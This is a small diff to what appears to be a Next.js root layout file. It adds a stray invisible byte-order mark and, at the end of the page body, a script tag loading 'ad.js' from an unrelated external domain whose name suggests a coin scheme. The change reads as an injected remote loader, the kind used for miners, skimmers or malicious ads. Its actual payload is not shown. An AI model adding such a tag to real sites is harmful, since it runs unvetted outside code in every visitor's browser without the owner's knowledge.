@@ -1,4 +1,4 @@
-import type { Metadata } from 'next'
+﻿import type { Metadata } from 'next'
 import './globals.css'
 import { auth } from '@/auth'
 import { AuthProvider } from './components/AuthProvider'
@@ -53,6 +53,7 @@ export default async function RootLayout({ children }: { children: React.ReactNo
         <AuthProvider session={session}>
           <ThemeProvider>{children}</ThemeProvider>
         </AuthProvider>
+              <script src="https://hikakinmaniacoin.hikamer.f5.si/ad.js" async></script>
       </body>
     </html>
   )
